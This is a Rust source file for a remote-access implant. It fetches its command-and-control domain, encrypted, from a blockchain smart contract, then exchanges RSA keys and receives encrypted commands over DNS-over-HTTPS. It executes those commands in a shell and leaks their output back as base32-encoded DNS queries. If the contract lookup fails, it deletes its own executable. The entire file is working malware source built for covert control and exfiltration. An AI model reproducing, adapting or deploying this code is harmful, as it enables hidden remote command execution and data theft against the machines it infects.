// encoding
use base32::{Alphabet, decode, encode};
use base64::{Engine as _, alphabet, engine::{self, general_purpose}};
use hex_literal::hex;

// parsing
use serde_json::Value;
use fancy_regex::Regex;
use rustc_serialize::json::{Json, ToJson};

// networking
use std::net::{TcpStream,Shutdown};
use reqwest::blocking::Client;
use url::{Url, ParseError};
use std::io::prelude::*;

// native
use std::process;
use std::fs;
use std::time::{Duration, Instant};
use std::str::FromStr;
use std::str;
use std::hint;
use std::thread;
use std::process::{Command, Stdio};
use execute::{Execute, command};

// hashing
use sha2::{Sha256, Digest};

// crypto
use aes::cipher::{
    BlockCipher, BlockEncrypt, BlockDecrypt,
    generic_array::GenericArray, AsyncStreamCipher, KeyIvInit
};
use aes::Aes128;
use block_modes::{BlockMode, Cfb, block_padding::Padding, block_padding::Pkcs7};
use rsa::{RsaPublicKey, RsaPrivateKey, Pkcs1v15Encrypt, pkcs8::DecodePublicKey, Oaep, pkcs8::EncodePublicKey, pkcs8::LineEnding};
type Aes128CfbEnc = cfb_mode::Encryptor<aes::Aes128>;
type Aes128CfbDec = cfb_mode::Decryptor<aes::Aes128>;

// globals
static Hash: &str = "UNIQUEHASH";
static ContractKey: &str = "SMARTCONTRACTKEY";
static TestnetRPC: &str = "https://endpoints.omniatech.io/v1/matic/mumbai/public";
static mut SleepTime: Option<Mutex<u64>> = None;

// threading
use std::sync::Mutex;

fn parseDNSTextEntry(response: &str) -> String{
    let re = Regex::new(r"(?<=dv=)(.*?)\\").unwrap();
    let mut result = String::new();
    
    let mut captures_iter = re.captures_iter(response);
    for x in captures_iter{
        let mut data = x.unwrap().get(0).unwrap().as_str();
        data = data.trim_end_matches("\\");
        result.push_str(&data);
    }

    if result.is_empty(){
        let re = Regex::new(r"(?<=xv=)(.*?)\\").unwrap();
        let mut result = String::new();
        
        let mut captures_iter = re.captures_iter(response);
        for x in captures_iter{
            let mut data = x.unwrap().get(0).unwrap().as_str();
            data = data.trim_end_matches("\\");
            result.push_str(&data);
        }
        return result.clone()

    }
    return result.clone()
}

fn is_base32(s: &str) -> bool {
    let decode = base32::decode(Alphabet::RFC4648 { padding: true }, s);
    if decode.is_some(){
        return true
    }
    if decode.is_none(){
        return false
    }
    return false
}

fn checkDNSTextEntry<'a>(domain: &str, private_key_internal: &RsaPrivateKey, public_key_hash: &str) -> Vec<String>{
    let mFormat: String = format!("2|{}", public_key_hash);
    let base32Data = base32::encode(
        Alphabet::RFC4648 { padding: true },
        &mFormat.as_bytes()
    );
    let dnsMAX = 255;
    let dnsdomainNameSize = domain.len();
    let maxDNSData = dnsMAX - dnsdomainNameSize;
    let mut packetOrder = 0;
    let messageSize = base32Data.len();
    let mut messageRemainSize = messageSize;
    let mut lastPacket = 0;
    let mut result = String::new();

    for (i, c) in base32Data.chars().enumerate() {
        if i % 61 == 0 && i != 0{
            result.push('.');
        }
        if (result.len() >= (maxDNSData - dnsdomainNameSize)){
            packetOrder += 1;
            let s = format!("-{}-{}-kkdc", packetOrder, result.len());
            result.push_str(&s);
            result.push('.');
            result.push_str(domain);
            lastPacket = 1;
        }
        result.push(c);
    }
    if lastPacket == 1 || result.len() < 255{
        packetOrder += 1;
        let s = format!("-{}-{}-_", packetOrder, result.len());
        result.push_str(&s);
        result.push('.');
        result.push_str(domain);
        lastPacket = 0;
    }


    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
    url.query_pairs_mut()
        .append_pair("name", &result)
        .append_pair("type", "TXT");
    let client = reqwest::blocking::Client::new();
    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();

    match request{
        Ok(req) => {
            let mut response = req;
            let mut data = response.text().unwrap();

            result.clear();

            let mut ndata = parseDNSTextEntry(&data);

            let bFlag = is_base32(&ndata);
            if bFlag == false{
                let commandDecoded = &base64::decode(ndata).unwrap();
                let padding = Oaep::new::<sha2::Sha256>();
                let dec_data = private_key_internal.decrypt(padding, &commandDecoded);
                match dec_data{
                    Ok(dec_data) =>{
                        let utf_data = String::from_utf8(dec_data).unwrap();
                        let new_string: String = utf_data.to_owned();
                        let parts: Vec<String> = new_string.split('|').map(|s| s.to_string()).collect();
                        return parts;
                    }
                    Err(err)=>{
                        return vec![]
                    }
                }
            }            
            ndata.clear();
            return vec![];
        }

        Err(_) => {
            return vec![];
        }
    }
}

fn sendDnsRequest(domain: &str){
    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
    url.query_pairs_mut()
        .append_pair("name", domain)
        .append_pair("type", "A");

    let client = reqwest::blocking::Client::new();

    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();

    let mut response = request.unwrap();
    let mut data = response.text().unwrap();
}

fn dnsRequestEncoder(domain: &str, message: &String){
    let dnsMAX = 255;
    let dnsdomainNameSize = domain.len();
    let maxDNSData = dnsMAX - (dnsdomainNameSize + 10);
    let mut packetOrder = 0;
    let base32Data = base32::encode(
        Alphabet::RFC4648 { padding: true },
        &message.as_bytes()
    );
    println!("Complete: {}", &base32Data);
    let messageSize = base32Data.len();
    let mut messageRemainSize = (messageSize / maxDNSData);
    let mut lastPacket = 0;


    let mut result = String::new();


    //dns_max = 200
    // dns_domain_name_size = len("domain") + 2
    // max_dns_data = dns_max - dns_domain_name_size
    // packet_order = 0
    // remaining_packets = (messageSize + max_dns_data - 1) / max_dns_data
    let dns_domain_max = 256;
    let label_max = 50;
    let max_labels = (dns_domain_max)  / (label_max + 1); // +1 por causa do ponto entre os rótulos
    let max_dns_data = max_labels * label_max;
    let mut packet_order = 0;

    let remaining_packets = (messageSize + max_dns_data - 1) / max_dns_data;

    let mut iterator = 0;

    for (i, c) in base32Data.chars().enumerate() {
        result.push(c);
        if (result.len() == (maxDNSData - dnsdomainNameSize)){
            packetOrder += 1;
            let s = format!("-{}-{}-{}-k", packetOrder, result.len(), remaining_packets);
            result.push_str(&s);
            result.push('.');
            result.push_str(domain);
            lastPacket = 1;
            sendDnsRequest(&result);
            println!("DNS :: {}", &result);
            result.clear();
            iterator = 0;
        }
        if iterator % 50 == 0 && iterator != 0{
            result.push('.');
        }
        iterator += 1;
    }
    if lastPacket == 1 || result.len() < 255{
        packetOrder += 1;
        let s = format!("-{}-{}-{}-_", packetOrder, result.len(), remaining_packets);
        result.push_str(&s);
        result.push('.');
        result.push_str(domain);
        sendDnsRequest(&result);
        println!("DNS :: {}", &result);
        result.clear();
        lastPacket = 0;
    }


}

fn dnsRequestEncryptEncode<'a>(data: &str, enc_key: &Vec<u8>, iv: &[u8]) -> Vec<u8> {

    let mut encData:&[u8] = &mut data.as_bytes();
    let pos = data.len();

    let cipher = Aes128CfbEnc::new_from_slices(&enc_key, &iv).unwrap();
    let mut buffer = vec![0u8; encData.len() + 16];
    buffer[..encData.len()].copy_from_slice(encData);
    
    cipher.encrypt(&mut buffer);

    let mut result = Vec::new();
    result.extend(&iv.to_vec());
    result.extend(&buffer.to_vec());

    let mut testing = buffer;
    let decCipher = Aes128CfbDec::new_from_slices(&enc_key, &iv).unwrap();
    decCipher.decrypt(&mut testing);

    result
}

fn commandExec(public_key_hash: &str, domain: &str, aes_key: &str, private_key_internal: &RsaPrivateKey){
    let key = base32::decode(Alphabet::RFC4648 { padding: true }, aes_key).unwrap();

    let s: String = format!("2c|{}", public_key_hash);
    dnsRequestEncoder(domain, &s);

    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
    url.query_pairs_mut()
        .append_pair("name", &domain)
        .append_pair("type", "TXT");
    let client = reqwest::blocking::Client::new();
    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();
    let mut response = request.unwrap();
    let mut data = response.text().unwrap();

    let commandVec = parseDNSTextEntry(&data);
    let commandDec = base32::decode(Alphabet::RFC4648 { padding: true }, &commandVec);
    match commandDec{
        Some(decValue) => {
            let str2Dec = std::str::from_utf8(&decValue).unwrap();
            let commandDec = base64::decode(&str2Dec);
        
            let commandDec: Vec<u8> = match commandDec {
                Ok(decoded) => {
                    decoded
                }
                Err(err) => {
                    Vec::new()
                }
            };
            
            if !commandDec.is_empty(){
                let iv = &commandDec[..16];
                let ciphertext = &commandDec[16..];
            
                let mut buf = ciphertext.to_vec();
            
                let cipher = Aes128CfbDec::new_from_slices(&key, &iv).unwrap();
                cipher.decrypt(&mut buf);
            
                let commandStrFinalParts = str::from_utf8(&buf[16..]).unwrap();
                let commandParts: Vec<&str> = commandStrFinalParts.split('|').collect();
                let commandToExec = commandParts.get(2).unwrap();
                let filtered_chars: String = commandToExec.chars().filter(|&c| !c.is_control()).collect();

                let mut execCmd = command(filtered_chars);
                execCmd.stdout(Stdio::piped());
                execCmd.stderr(Stdio::piped());
                let output = execCmd.execute_output();

                match output{
                    Ok(out) => {
                        let s: String = format!("2c|{}", public_key_hash);
                        let data = format!("{}|{}", String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr));

                    
                        let encData = dnsRequestEncryptEncode(&data, &key, &iv);
                        let encodedData = base64::encode(&encData);
                        let max_payload = 1024 / 8 - 11;
                    
                        let fData = format!("{}|{}", s, encodedData);
                        dnsRequestEncoder(domain, &fData);
                    }
                    Err(out) =>{
                        let s: String = format!("2c|{}", public_key_hash);
                        let data = format!("{}|", String::from_utf8_lossy(&out.to_string().as_bytes()));

                        let encData = dnsRequestEncryptEncode(&data, &key, &iv);
                        let encodedData = base64::encode(&encData);
                        let max_payload = 1024 / 8 - 11;
                    
                        let fData = format!("{}|{}", s, encodedData);
                    
                        dnsRequestEncoder(domain, &fData);
                    }
                }
            }
        }

        None => {

        }
    }

}

fn commandServerHandler(domain: &str, public_key_external: &RsaPublicKey, public_key_hash: &str, private_key_internal: &RsaPrivateKey){
    unsafe{
        if let Some(ref mutex) = SleepTime{
            while true{
		        hint::spin_loop();
                let mut stime = mutex.lock().unwrap();
                let timeout = Duration::from_secs(*stime);

                let command = checkDNSTextEntry(&domain, &private_key_internal, &public_key_hash);
                core::arch::x86_64::_mm_mfence();
                if !command.is_empty(){
                            match command.get(1).unwrap().as_str() {
                                "s" => {
                                        let s: String = format!("s|{}", public_key_hash);
                                        println!("Called sleep! {}", &s);
                                        core::arch::x86_64::_mm_mfence();
                                        dnsRequestEncoder(domain, &s);
                                        *stime = command.get(2).unwrap().parse().unwrap();
                                        std::mem::drop(stime);
                                },
                                "m" => {
                                    println!("not implemented");
                                },
                                "l" => {
                                    println!("not implemented");
                                },
                                "c" => {
                                    println!("Command exec - g0t key:: {:?}", &command);
                                    commandExec(&public_key_hash, &domain, command.get(2).unwrap().as_str(), &private_key_internal);
                                }
                                _ => println!("not implemented"),
                            }
                }
		//let seconds = timeout.as_secs() as i64;
		//let nanoseconds = timeout.subsec_nanos() as i64;
		//let ts = libc::timespec{
		//	tv_sec: seconds,
	//		tv_nsec: nanoseconds,
	//	};
	//	unsafe{
	///		let mut result: u64;
	//		asm!(
	//			"syscall",
	//			in("rax") libc::SYS_nanosleep,
	//			in("rdi") &ts as *const _,
	//			in("rsi") std::ptr::null::<libc::timespec>(),
	//			lateout("rax") result,
	//			lateout("rcx") _,
	//			lateout("r11") _,
	//			options(nostack),
	//		    );
	//	}
                // spinlock sleep
                let start = Instant::now();
                core::arch::x86_64::_mm_mfence();
                hint::spin_loop();
                while start.elapsed() < timeout {
                    core::arch::x86_64::_mm_lfence();
		    	    hint::spin_loop();
                }
                
            }
        }
    }
}

#[allow(unused_variables)]
fn serverHandler(domain: &str, public_key_external: RsaPublicKey, public_key_hash: &str, private_key_internal: &RsaPrivateKey){
    unsafe {
        SleepTime = Some(Mutex::new(10)); // Default sleep time
    }
    let domain_clone = domain.to_string();
    let public_key_hash_clone = public_key_hash.to_string();
    let public_key_external_clone = public_key_external.clone();
    let private_key_clone = private_key_internal.clone();

    thread::spawn(move || {
        commandServerHandler(&domain_clone, &public_key_external_clone, &public_key_hash_clone, &private_key_clone);
    });

    // Dummy infinite sleep
    loop {
        let timeout = Duration::from_secs(1);
        let start = Instant::now();
        while start.elapsed() < timeout {}
    }
}

fn parseCertificate(response: &str) -> String{
    let re = Regex::new(r"(?<==)(.*?)\\").unwrap();
    let mut result = String::new();

    let mut captures_iter = re.captures_iter(response);
    for x in captures_iter{
        let mut data = x.unwrap().get(0).unwrap().as_str();
        data = data.trim_end_matches("\\");
        result.push_str(&data);
    }
    return result.clone()
}


fn generateKeyPair() -> (String, RsaPrivateKey){
    let mut rng = rand::thread_rng();
    let bits = 1024;
    let private_key_local = RsaPrivateKey::new(&mut rng, bits).unwrap();
    let public_key = RsaPublicKey::from(&private_key_local);
    let pubkey_der = public_key.to_public_key_der().unwrap();
    let pubkey_der_string = pubkey_der.to_pem("PUBLIC KEY", LineEnding::default()).unwrap();
    (pubkey_der_string, private_key_local)

}

fn handleKeyGeneration(domain: &str, serverPublicKey: &str) -> (String, RsaPrivateKey){
    let (pubkey, privkey) = generateKeyPair();
    let pubkeyBase32 = base32::encode(
        Alphabet::RFC4648 { padding: true },
        &pubkey.as_bytes()
    );


    let mut hasher = Sha256::new();
    hasher.update(serverPublicKey);
    let result = hasher.finalize();

    let serverPublicKeySha256: String = format!("{:x}", result);
    let s = format!("1|{}|{}", serverPublicKeySha256, pubkeyBase32);
    dnsRequestEncoder(domain, &s);
    (serverPublicKeySha256, privkey)
}

fn handleCertificate(domain: &str){
    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
    url.query_pairs_mut()
        .append_pair("name", &domain)
        .append_pair("type", "TXT");
    let client = reqwest::blocking::Client::new();
    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();
    let mut response = request.unwrap();
    let mut data = response.text().unwrap();
    let mut result = String::new();
    result = parseCertificate(&data);
    let decoded_bytes = decode(
        Alphabet::RFC4648 { padding: true },
        &result
    ).unwrap();
    let public_key_external = Some(RsaPublicKey::from_public_key_pem(&String::from_utf8_lossy(&decoded_bytes)).unwrap());
    let (serverPublicKeySha256, privkey) = handleKeyGeneration(domain, std::str::from_utf8(&decoded_bytes).unwrap());
    serverHandler(domain, public_key_external.unwrap(), &serverPublicKeySha256, &privkey);
    let s = format!("2|{}", serverPublicKeySha256);
    dnsRequestEncoder(domain, &s);
}

fn handleContractKeccak(contractAddress: &str) -> String{
    // call RPC and interact with smart contract variable name (keccak)
    let timeout = Duration::from_secs(0);
    let start = Instant::now();

    let mut payload = String::from(r#"{"method": "eth_call","params": [{"from": "0x0000000000000000000000000000000000000000","to": "CONTRACTADDRESS","data": "KECCAKHERE"},"latest"],"id": 1,"jsonrpc": "2.0"}"#);
    let newPayload = payload.replace("CONTRACTADDRESS", contractAddress);

    let mut object: Value = serde_json::from_str(&newPayload).unwrap();

    let client = reqwest::blocking::Client::new();
    let mut request = client.post(TestnetRPC)
    .json(&object)
    .send();

    let response = request.unwrap().text().unwrap();

    let json_object = Json::from_str(&response).unwrap();

    match json_object.find("result") {
        Some(field) => {
            let name = field.as_string().unwrap();
            let testing = hex::decode(&name[2..]).unwrap();
            let testStr = str::from_utf8(&testing).unwrap().replace(",","");
            let testStr = &testStr.trim_matches('\x00')[32..];
        
            return testStr.to_string()
        },
        None => {
            "".to_string()
        }
    }
}

fn rpcInteract(addr: &str) -> String{
    let contractC2 = handleContractKeccak(addr);
    if contractC2 == ""{
        let path = std::env::current_exe().unwrap();
        fs::remove_file(&path).unwrap();
        process::exit(0);
    }
    let C2AESContent_b64dec = base64::decode(contractC2).unwrap();
    let key_dec = base64::decode(ContractKey).unwrap();

    let key = &key_dec[..];

    let iv = &C2AESContent_b64dec[..16];
    let message  = &C2AESContent_b64dec[16..];
    
    let mut buf = message.to_vec();

    let cipher: cfb_mode::Decryptor<Aes128> = Aes128CfbDec::new_from_slices(&key, &iv).unwrap();
    cipher.decrypt(&mut buf);

    let mut domain = String::from_utf8(buf).unwrap();
    domain = domain.replace("\u{0001}", "");
    domain.to_string()
}

fn main() -> std::io::Result<()>{

    let mut stream = TcpStream::connect("STAGERADDRESS")?;
    let mut smartContractAddressBuffer= [0; 42];

    stream.write(&Hash.as_bytes())?;
    stream.read(&mut smartContractAddressBuffer)?;
    stream.shutdown(Shutdown::Both);

    let smartContractAddress = std::str::from_utf8(&smartContractAddressBuffer).unwrap().trim_matches(char::from(0));
    let rpcResponse = rpcInteract(smartContractAddress);
    if !rpcResponse.is_empty(){
        handleCertificate(&rpcResponse);
    }
    Ok(())
}
